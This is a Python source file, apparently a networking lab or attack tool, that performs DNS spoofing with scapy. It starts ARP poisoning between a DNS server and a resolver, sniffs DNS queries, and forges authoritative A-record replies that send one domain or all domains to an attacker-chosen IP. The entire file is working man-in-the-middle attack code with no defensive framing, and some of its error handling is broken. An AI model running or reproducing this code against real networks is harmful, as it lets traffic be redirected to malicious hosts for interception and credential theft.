from scapy.all import *
from scapy.layers.l2 import *
import ARP as arpattack
import threading
from netifaces import AF_INET
import netifaces as ni


class DNSattack:

    exit_loop = None

    def __init__(self, auth, rec, domain, ip_insert):
        self.auth = auth
        self.rec = rec
        self.domain = domain
        self.ip_insert = ip_insert

    def start_spoof_all(ip_insert, auth, rec):
        auth_mac = DNSattack.get_mac(auth)
        #print("mac auth is " + auth_mac)
        rec_mac = DNSattack.get_mac(rec)
        #print("mac auth is " + rec_mac)

        poison = threading.Thread(target=arpattack.ARPattack.start_attack,
                                  args=(auth, auth_mac, rec, rec_mac, 5, 10, False))
        poison.start()

        DNSattack.exit_loop = False
        sniff(filter='udp port 53 and ip dst %s'%(auth), prn=DNSattack.spoof_all(ip_insert, auth, rec))

    def spoof_all(ip_insert, auth, rec):
        print("> DNS: Starting packet scan and manipulation")
        def reply_to_all(pkt):
            if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0
                    and pkt[IP].src == rec and pkt[IP].dst == auth):
                spoof_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=0,
                                arcount=0, an=(DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata=ip_insert)))
                send(spoof_pkt, verbose=1)
                print("> DNS: Packet forged successfully")
            else:
                send(pkt, verbose=0)
        if not DNSattack.exit_loop:
            return reply_to_all
        else:
            print("> DNS: Spoofing stopped")

    def start_spoof(domain, ip_insert, auth, rec):
        auth_mac = DNSattack.get_mac(auth)
        rec_mac = DNSattack.get_mac(rec)
        #print(auth)
        #print(auth_mac)
        #print(rec)
        #print(rec_mac)

        poison = threading.Thread(target=arpattack.ARPattack.start_attack,
                                  args=(auth, auth_mac, rec, rec_mac, 5, 10, False))
        poison.start()

        DNSattack.exit_loop = False
        sniff(filter='udp port 53 and ip dst %s'%(auth), prn=DNSattack.spoof(domain, ip_insert, auth, rec))

    def spoof(domain, ip_insert, auth, rec):
        print("> DNS: Starting packet scan and manipulation")
        def reply_to_single(pkt):
            if DNS in pkt and pkt[DNS].opcode==0 and pkt[DNS].ancount==0 and pkt[IP]:
                if domain in str(pkt[DNSQR].qname, 'utf-8'):
                    spoof_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=0,
                                    arcount=0, an=(DNSRR(
                                        rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata=ip_insert)))
                    send(spoof_pkt, verbose=0)
                    print("> DNS: Packet forged successfully")
                else:
                    send(pkt, verbose=0)
            else:
                send(pkt, verbose=0)
        if not DNSattack.exit_loop:
            return reply_to_single
        else:
            print("> DNS: Spoofing stopped")

    def get_mac(ip_address):
        ret = []
        try:
            f = open("/proc/net/if_inet6","r")
        except IOError and err:
            return ret
        l = f.readlines()
        for i in l:
            # addr, index, plen, scope, flags, ifname
            tmp = i.split()
            ret.append(str(tmp[5]))
        for interface in ret:
            conf.iface = interface
            ip = ni.ifaddresses(interface)[AF_INET][0]["addr"]
            if ARP(pdst=ip_address+"/24") == ARP(pdst=ip+"/24"):
                ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2)

                for snd,rcv in ans:
                    if rcv.sprintf(r"%ARP.psrc%") == ip_address:
                        return rcv.sprintf(r"%Ether.src%")
